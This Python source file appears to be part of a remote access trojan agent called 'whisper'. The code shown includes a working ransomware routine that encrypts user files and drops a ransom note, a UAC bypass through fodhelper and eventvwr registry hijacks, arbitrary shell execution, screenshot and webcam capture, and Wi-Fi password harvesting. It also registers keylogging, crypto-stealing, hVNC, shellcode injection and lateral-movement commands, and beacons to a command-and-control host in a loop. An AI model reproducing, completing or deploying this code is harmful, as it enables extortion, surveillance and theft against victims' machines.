import os, base64, hashlib, hmac, struct, time

_RANSOM_EXT = ".whisper"
_RANSOM_NOTE = "README_DECRYPT.txt"
_RANSOM_NOTE_TEXT = "YOUR FILES HAVE BEEN ENCRYPTED\n\nAll your documents, databases, images and other important files have been encrypted with a strong cipher.\nTo recover your files, contact the administrator.\nYour unique ID: {victim_id}\n\nDO NOT attempt to decrypt files yourself - this will result in permanent data loss.\n"

_TARGET_EXTS = [".pdf",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".txt",".csv",
                ".jpg",".jpeg",".png",".bmp",".gif",".tiff",
                ".zip",".rar",".7z",".tar",".gz",
                ".py",".js",".ts",".java",".cpp",".c",".cs",".php",".rb",".go",
                ".sql",".db",".sqlite",".mdb",".accdb",
                ".pem",".key",".ovpn",".kdbx",
                ".eml",".msg",".pst",
                ".mp3",".mp4",".avi",".mkv",
                ".dwg",".dxf",".psd",".ai",".indd",
                ".config",".env",".yml",".yaml",".json",".xml"]

def _ransom_encrypt_file(fpath, key):
    try:
        with open(fpath, "rb") as f:
            plain = f.read()
        if not plain: return False
        # Encrypt using derived key stream
        iv = os.urandom(16)
        ks, ctr = b"", 0
        while len(ks) < len(plain):
            ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest()
            ctr += 1
        ct = bytes(p ^ k for p, k in zip(plain, ks))
        tag = hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]
        enc_data = iv + tag + ct
        os.remove(fpath)
        with open(fpath + _RANSOM_EXT, "wb") as f:
            f.write(enc_data)
        return True
    except: return False

def _ransom_decrypt_file(fpath, key):
    try:
        if not fpath.endswith(_RANSOM_EXT): return False
        with open(fpath, "rb") as f:
            data = f.read()
        if len(data) < 32: return False
        iv, tag, ct = data[:16], data[16:32], data[32:]
        if not hmac.compare_digest(tag, hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]):
            return False
        ks, ctr = b"", 0
        while len(ks) < len(ct):
            ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest()
            ctr += 1
        plain = bytes(p ^ k for p, k in zip(ct, ks))
        orig_path = fpath[:-len(_RANSOM_EXT)]
        os.remove(fpath)
        with open(orig_path, "wb") as f:
            f.write(plain)
        return True
    except: return False

def _ransom_walk(start_dir, key, encrypt=True, exts=None, max_files=100):
    encrypted = 0
    skipped = 0
    target_exts = exts or _TARGET_EXTS
    start_dir = os.path.abspath(start_dir)
    skip_dirs = {os.path.join(start_dir, d) for d in ["Windows", "Winnt", "$Recycle.Bin", "System32", "Program Files",
                                                       "Program Files (x86)", "ProgramData", "AppData",
                                                       "node_modules", ".git", ".svn", "__pycache__"]}
    for root, dirs, files in os.walk(start_dir):
        dirs[:] = [d for d in dirs if os.path.join(root, d) not in skip_dirs]
        for fname in files:
            fpath = os.path.join(root, fname)
            if encrypt:
                ext = os.path.splitext(fname)[1].lower()
                if ext in target_exts and not fname.startswith(".") and ext != _RANSOM_EXT:
                    if _ransom_encrypt_file(fpath, key):
                        encrypted += 1
                        if encrypted >= max_files: return encrypted, skipped
            else:
                if fname.endswith(_RANSOM_EXT):
                    if _ransom_decrypt_file(fpath, key):
                        encrypted += 1
                        if encrypted >= max_files: return encrypted, skipped
            if encrypted >= max_files: break
    return encrypted, skipped

def _cmd_ransom_encrypt(m):
    try:
        password = m.get("password", "ransom_key_whisper")
        key = hashlib.sha256(password.encode()).digest()
        root = m.get("path", os.path.expanduser("~"))
        max_files = min(m.get("max", 50), 500)
        exts = m.get("extensions", None)
        if exts: exts = [e.strip() if e.startswith(".") else "." + e.strip() for e in exts.split(",")]
        count, _ = _ransom_walk(root, key, encrypt=True, exts=exts, max_files=max_files)
        # Write ransom note
        note_path = os.path.join(root, _RANSOM_NOTE)
        victim_id = hashlib.md5((password + str(time.time())).encode()).hexdigest()[:8]
        try:
            with open(note_path, "w") as f:
                f.write(_RANSOM_NOTE_TEXT.format(victim_id=victim_id))
        except: pass
        return {"output": f"[+] Ransomware: Encrypted {count} files in {root}\n    Note: {note_path}\n    Key: {password} (keep this for decryption)"}
    except Exception as e: return {"output": f"[!] Ransomware error: {e}"}

def _cmd_ransom_decrypt(m):
    try:
        password = m.get("password", "ransom_key_whisper")
        key = hashlib.sha256(password.encode()).digest()
        root = m.get("path", os.path.expanduser("~"))
        max_files = min(m.get("max", 100), 500)
        count, _ = _ransom_walk(root, key, encrypt=False, max_files=max_files)
        return {"output": f"[+] Decrypted {count} files in {root}"}
    except Exception as e: return {"output": f"[!] Decrypt error: {e}"}

_CMDS["ransom_encrypt"] = _cmd_ransom_encrypt
_CMDS["ransom_decrypt"] = _cmd_ransom_decrypt


# --- screenshot plugin ---

def _cmd_screenshot(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] Screenshot requires Windows"}
        import ctypes, struct
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        hdc_src = ctypes.windll.user32.GetDC(None)
        hdc_dst = ctypes.windll.gdi32.CreateCompatibleDC(hdc_src)
        hbmp = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc_src, w, h)
        ctypes.windll.gdi32.SelectObject(hdc_dst, hbmp)
        ctypes.windll.gdi32.BitBlt(hdc_dst, 0, 0, w, h, hdc_src, 0, 0, 0x00CC0020)
        sz = w * h * 4
        bits = (ctypes.c_byte * sz)()
        class BIH(ctypes.Structure): _fields_ = [("s", ctypes.c_uint32),("w", ctypes.c_int32),("h", ctypes.c_int32),("p", ctypes.c_uint16),("b", ctypes.c_uint16),("c", ctypes.c_uint32),("s2", ctypes.c_uint32),("x", ctypes.c_int32),("y", ctypes.c_int32),("u", ctypes.c_uint32),("v", ctypes.c_uint32)]
        bih = BIH(40, w, h, 1, 32, 0, 0, 0, 0, 0, 0)
        ctypes.windll.gdi32.GetDIBits(hdc_dst, hbmp, 0, h, bits, ctypes.byref(bih), 0)
        ctypes.windll.user32.ReleaseDC(None, hdc_src); ctypes.windll.gdi32.DeleteDC(hdc_dst); ctypes.windll.gdi32.DeleteObject(hbmp)
        data = struct.pack("<HIHHI", 0x4D42, 54+sz, 0, 0, 54) + ctypes.string_at(ctypes.byref(bih), 40) + bytes(bits)
        return {"data": base64.b64encode(data).decode()}
    except Exception as e:
        try:
            import subprocess, base64
            ps = '''
Add-Type -AssemblyName System.Drawing,System.Windows.Forms
$bmp = [System.Windows.Forms.Clipboard]::GetImage()
if (-not $bmp) {
    $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0,0,0,0,$bmp.Size)
    $g.Dispose()
}
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
$bmp.Dispose()
'''
            r = subprocess.run(["powershell","-NoP","-NonI","-Command",ps], capture_output=True, text=True, timeout=30, creationflags=0x08000000)
            if r.returncode == 0 and r.stdout.strip():
                return {"data": r.stdout.strip()}
            raise Exception(r.stderr[:200] if r.stderr else "PS failed")
        except Exception as e2:
            return {"output": f"[!] Screenshot failed: {e2}"}
_CMDS["screenshot"] = _cmd_screenshot


# --- shell plugin ---

def _cmd_shell(m):
    try:
        r = subprocess.run(m["cmd"], shell=True, capture_output=True, text=True, timeout=120)
        return {"output": (r.stdout + r.stderr) or "(no output)"}
    except subprocess.TimeoutExpired: return {"output": "[!] Timed out"}
    except Exception as e: return {"output": f"[!] {e}"}
_CMDS["shell"] = _cmd_shell


# --- uac_bypass plugin ---

import ctypes, sys, tempfile, atexit

def _uac_elevated_cmd():
    if getattr(sys, 'frozen', False):
        return f'"{sys.executable}"'
    if hasattr(sys.modules.get("__main__", None), "__file__") and sys.modules["__main__"].__file__:
        script = sys.modules["__main__"].__file__
        return f'"{sys.executable}" "{script}"'
    stub_path = os.path.join(tempfile.gettempdir(), f"whisper_elevated_{os.getpid()}.py")
    try:
        import __main__ as mm
        code = (inspect.getsource(mm) if hasattr(inspect, "getsource") else "") or ""
        if not code:
            code = str(mm.__code__.co_code) if hasattr(mm, "__code__") else ""
    except:
        code = ""
    if not code or len(code) < 500:
        code = (
            "import socket,base64,json,os,sys,struct,hashlib,hmac,time,threading,subprocess,platform\n"
            f"C2_HOST={C2_HOST!r};C2_PORT={C2_PORT}\n"
            f"ENCRYPTION_PASSWORD={ENCRYPTION_PASSWORD!r}\n"
            f"RECONNECT_DELAY={RECONNECT_DELAY}\n\n"
            "def _k(): return hashlib.pbkdf2_hmac('sha256',ENCRYPTION_PASSWORD.encode(),b'whisper_salt_2024',100000,32)\n"
            "def _eb(p,k):\n"
            "    iv=os.urandom(16);ks=b'';c=0\n"
            "    while len(ks)<len(p):\n"
            "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
            "    return iv+hmac.new(k,iv+bytes(x^y for x,y in zip(p,ks)),hashlib.sha256).digest()[:16]+bytes(x^y for x,y in zip(p,ks))\n"
            "def _db(d,k):\n"
            "    iv,tag,ct=d[:16],d[16:32],d[32:]\n"
            "    if not hmac.compare_digest(tag,hmac.new(k,iv+ct,hashlib.sha256).digest()[:16]):raise ValueError('integrity')\n"
            "    ks,b''=b'',0\n"
            "    while len(ks)<len(ct):\n"
            "        ks+=hmac.new(k,iv+struct.pack('>Q',c),hashlib.sha256).digest();c+=1\n"
            "    return bytes(x^y for x,y in zip(ct,ks))\n"
            "def enc(d):return base64.b64encode(_eb(json.dumps(d).encode(),_k()))\n"
            "def dec(d):return json.loads(_db(base64.b64decode(d),_k()))\n"
            "def rms(s):\n"
            "    r=s.recv(4)\n"
            "    if not r:return None\n"
            "    sz=int.from_bytes(r,'big');d=b''\n"
            "    while len(d)<sz:\n"
            "        c=s.recv(sz-len(d))\n"
            "        if not c:return None\n"
            "        d+=c\n"
            "    return dec(d)\n"
            "def sms(s,d):\n"
            "    p=enc(d);s.sendall(len(p).to_bytes(4,'big')+p)\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.settimeout(30);s.connect((C2_HOST,C2_PORT))\n"
            "sms(s,{'type':'init','os':platform.platform(),'hostname':platform.node(),'user':os.environ.get('USERNAME','?'),'arch':platform.machine(),'pid':os.getpid(),'elevated':True})\n"
            "s.settimeout(15)\n"
            "while True:\n"
            "    try:\n"
            "        m=rms(s)\n"
            "        if m is None:break\n"
            "        if m['type']=='exit':s.close();break\n"
            "        fn=_CMDS.get(m['type'])\n"
            "        if fn:\n"
            "            try:\n"
            "                r=fn(m)\n"
            "                if r is not None:sms(s,{'type':'response',**r})\n"
            "            except Exception as e:sms(s,{'type':'response','error':str(e)})\n"
            "    except socket.timeout:\n"
            "        sms(s,{'type':'ping'})\n"
        )
    with open(stub_path, "w", encoding="utf-8") as f:
        f.write(code)
    atexit.register(lambda: os.remove(stub_path) if os.path.exists(stub_path) else None)
    return f'"{sys.executable}" "{stub_path}"'

def _uac_fodhelper():
    import winreg
    try:
        cmd = _uac_elevated_cmd()
        key_path = r"Software\Classes\ms-settings\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
            winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        subprocess.Popen(["fodhelper.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _uac_eventvwr():
    import winreg
    try:
        cmd = _uac_elevated_cmd()
        key_path = r"Software\Classes\mscfile\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as k:
            winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
        subprocess.Popen(["eventvwr.exe"], shell=True, close_fds=True)
        time.sleep(2)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\mscfile", 0, winreg.KEY_WRITE) as k:
            winreg.DeleteKey(k, r"shell\open\command")
        return True
    except: return False

def _cmd_uac_bypass(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] UAC bypass is Windows-only"}
        if ctypes.windll.shell32.IsUserAnAdmin():
            return {"output": "[+] Already running as admin"}
        method = m.get("method", "fodhelper")
        ok = None
        if method in ("fodhelper", "auto"):
            ok = _uac_fodhelper()
        if not ok and method in ("eventvwr", "auto"):
            ok = _uac_eventvwr()
        if ok:
            return {"output": f"[+] UAC bypass triggered via {method}, elevated reconnecting agent spawned", "_exit": True}
        return {"output": "[!] UAC bypass failed"}
    except Exception as e: return {"output": f"[!] UAC bypass error: {e}"}
_CMDS["uac_bypass"] = _cmd_uac_bypass


# --- vuln_scan plugin ---

import ctypes, subprocess, os, platform

def _check_uac():
    import winreg
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ) as k:
            val, _ = winreg.QueryValueEx(k, "EnableLUA")
            if val == 0: return "UAC Disabled (vulnerable)"
            val2, _ = winreg.QueryValueEx(k, "ConsentPromptBehaviorAdmin")
            if val2 == 0: return "UAC No Prompt (vulnerable)"
            return "UAC Enabled (default)"
    except: return "UAC: Unknown"

def _check_defender():
    try:
        out = subprocess.check_output(["powershell", "-Command", "(Get-MpComputerStatus).RealTimeProtectionEnabled"], timeout=10, creationflags=0x08000000).decode().strip()
        if "True" in out: return "Defender: Enabled"
        return "Defender: DISABLED"
    except: return "Defender: Unknown"

def _check_firewall():
    try:
        out = subprocess.check_output(["netsh", "advfirewall", "show", "allprofiles", "state"], timeout=10, creationflags=0x08000000).decode()
        enabled = out.lower().count("on")
        total = out.lower().count("profile")
        if enabled >= total / 2: return f"Firewall: Enabled ({enabled}/{total} profiles)"
        return f"Firewall: WEAK ({enabled}/{total} profiles)"
    except: return "Firewall: Unknown"

def _check_lsa_protection():
    import winreg
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\LSA", 0, winreg.KEY_READ) as k:
            val, _ = winreg.QueryValueEx(k, "RunAsPPL")
            if val == 1: return "LSA Protection: Enabled (RunAsPPL)"
            return "LSA Protection: DISABLED"
    except: return "LSA Protection: Unknown"

def _check_credui():
    import winreg
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_READ) as k:
            val, _ = winreg.QueryValueEx(k, "EnableLUA")
            val2, _ = winreg.QueryValueEx(k, "EnableInstallerDetection")
            if val2 == 1: return "CredUI: Protected"
            return "CredUI: Weak"
    except: return "CredUI: Unknown"

def _check_powershell_logging():
    import winreg
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging", 0, winreg.KEY_READ) as k:
            val, _ = winreg.QueryValueEx(k, "EnableScriptBlockLogging")
            if val == 1: return "PS Logging: Enabled"
            return "PS Logging: DISABLED"
    except: return "PS Logging: DISABLED"

def _check_wdigest():
    import winreg
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest", 0, winreg.KEY_READ) as k:
            val, _ = winreg.QueryValueEx(k, "UseLogonCredential")
            if val != 0: return "WDigest: CLEARTEXT passwords"
            return "WDigest: Disabled"
    except: return "WDigest: Disabled"

def _check_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return "Privilege: ADMIN"
        return "Privilege: User"
    except: return "Privilege: Unknown"

def _cmd_vuln_scan(m):
    try:
        if platform.system() != "Windows":
            return {"output": "[!] Vulnerability scanner requires Windows"}
        checks = [
            _check_admin(),
            _check_uac(),
            _check_defender(),
            _check_firewall(),
            _check_lsa_protection(),
            _check_credui(),
            _check_powershell_logging(),
            _check_wdigest(),
        ]
        vulns = [c for c in checks if "DISABLED" in c or "WEAK" in c or "CLEARTEXT" in c or "User" in c]
        output = "[+] Vulnerability Scan Results:\n"
        for c in checks:
            tag = "[!]" if ("DISABLED" in c or "WEAK" in c or "CLEARTEXT" in c) else "[+]" if "Enabled" in c or "ADMIN" in c else "[?]"
            output += f"  {tag} {c}\n"
        if vulns:
            output += f"\n  [!] {len(vulns)} potential vulnerabilities found\n"
        else:
            output += "\n  [OK] No obvious vulnerabilities\n"
        return {"output": output}
    except Exception as e: return {"output": f"[!] Vuln scan error: {e}"}
_CMDS["vuln_scan"] = _cmd_vuln_scan


# --- webcam plugin ---

def _cmd_webcam(m):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return {"output": "[!] No webcam found"}
        ret, frame = cap.read()
        cap.release()
        if not ret: return {"output": "[!] Capture failed"}
        _, buf = cv2.imencode(".jpg", frame)
        return {"data": base64.b64encode(buf.tobytes()).decode()}
    except ImportError:
        return {"output": "[!] Webcam requires opencv-python-headless on the target machine. Install: pip install opencv-python-headless"}
    except Exception as e:
        return {"output": f"[!] Webcam: {e}"}
_CMDS["webcam"] = _cmd_webcam


# --- wifi_harvest plugin ---

def _cmd_wifi_harvest(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Windows only"}
        r = subprocess.run(["netsh","wlan","show","profiles"], capture_output=True, text=True, timeout=30)
        profiles = []
        for line in r.stdout.split("\n"):
            if "All User Profile" in line:
                p = line.split(":")[-1].strip()
                r2 = subprocess.run(["netsh","wlan","show","profile",p,"key=clear"], capture_output=True, text=True, timeout=15)
                key = ""
                for l2 in r2.stdout.split("\n"):
                    if "Key Content" in l2: key = l2.split(":")[-1].strip()
                profiles.append({"ssid": p, "password": key})
        return {"data": {"networks": profiles, "count": len(profiles)}}
    except Exception as e: return {"output": f"[!] WiFi harvest: {e}"}
_CMDS["wifi_harvest"] = _cmd_wifi_harvest

_CMDS['check_vm'] = _cmd_check_vm
_CMDS['harvest'] = _cmd_harvest
_CMDS['clipboard_get'] = _cmd_clipboard_get
_CMDS['clipboard_monitor'] = _cmd_clipboard_monitor
_CMDS['clipboard_set'] = _cmd_clipboard_set
_CMDS['clipper_start'] = _cmd_clipper_start
_CMDS['clipper_stop'] = _cmd_clipper_stop
_CMDS['clipper_test'] = _cmd_clipper_test
_CMDS['crypto_steal'] = _cmd_crypto_steal
_CMDS['dns_get'] = _cmd_dns_get
_CMDS['dns_set'] = _cmd_dns_set
_CMDS['dns_restore'] = _cmd_dns_restore
_CMDS['file_hunt'] = _cmd_file_hunt
_CMDS['ls'] = _cmd_ls
_CMDS['upload'] = _cmd_upload
_CMDS['download'] = _cmd_download
_CMDS['delete'] = _cmd_delete
_CMDS['execute'] = _cmd_execute
_CMDS['search'] = _cmd_search
_CMDS['hvnc_start'] = _cmd_hvnc_start
_CMDS['hvnc_stop'] = _cmd_hvnc_stop
_CMDS['hvnc_screenshot'] = _cmd_hvnc_screenshot
_CMDS['hvnc_stream'] = _cmd_hvnc_stream
_CMDS['hvnc_mouse'] = _cmd_hvnc_mouse
_CMDS['hvnc_key'] = _cmd_hvnc_key
_CMDS['keylog_start'] = _cmd_keylog_start
_CMDS['keylog_stop'] = _cmd_keylog_stop
_CMDS['keylog_get'] = _cmd_keylog_get
_CMDS['psexec'] = _cmd_psexec
_CMDS['wmiexec'] = _cmd_wmiexec
_CMDS['dcomexec'] = _cmd_dcomexec
_CMDS['rdp_harvest'] = _cmd_rdp_harvest
_CMDS['persist'] = _cmd_persist
_CMDS['persist_check'] = _cmd_persist_check
_CMDS['inject_shellcode'] = _cmd_inject_shellcode
_CMDS['process_hollow'] = _cmd_process_hollow
_CMDS['list_processes'] = _cmd_list_processes
_CMDS['ransom_encrypt'] = _cmd_ransom_encrypt
_CMDS['ransom_decrypt'] = _cmd_ransom_decrypt
_CMDS['screenshot'] = _cmd_screenshot
_CMDS['shell'] = _cmd_shell
_CMDS['uac_bypass'] = _cmd_uac_bypass
_CMDS['vuln_scan'] = _cmd_vuln_scan
_CMDS['webcam'] = _cmd_webcam
_CMDS['wifi_harvest'] = _cmd_wifi_harvest

def _cmd_info(m):
    return {"os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid(),"cwd":os.getcwd()}
_CMDS["info"] = _cmd_info

def _main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30); s.connect((C2_HOST, C2_PORT))
            sms(s, {"type":"init","os":platform.platform(),"hostname":platform.node(),"user":os.environ.get("USERNAME") or os.environ.get("USER") or "unknown","arch":platform.machine(),"pid":os.getpid()})
            s.settimeout(15)
            while True:
                try:
                    m = rms(s)
                    if m is None: break
                except socket.timeout:
                    try:
                        s.settimeout(1)
                        sms(s, {"type":"ping"})
                    except:
                        pass
                    finally:
                        s.settimeout(15)
                    continue
                if m["type"] == "exit": s.close(); return
                fn = _CMDS.get(m["type"])
                if fn:
                    try:
                        r = fn(m)
                        if r is not None:
                            _exit = r.pop("_exit", False)
                            sms(s, {"type":"response",**r})
                            if _exit: s.close(); return
                    except Exception as e: sms(s, {"type":"response","error":str(e)})
                else:
                    sms(s, {"type":"response","error":f"Unknown command: {m['type']}"})
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    _main()
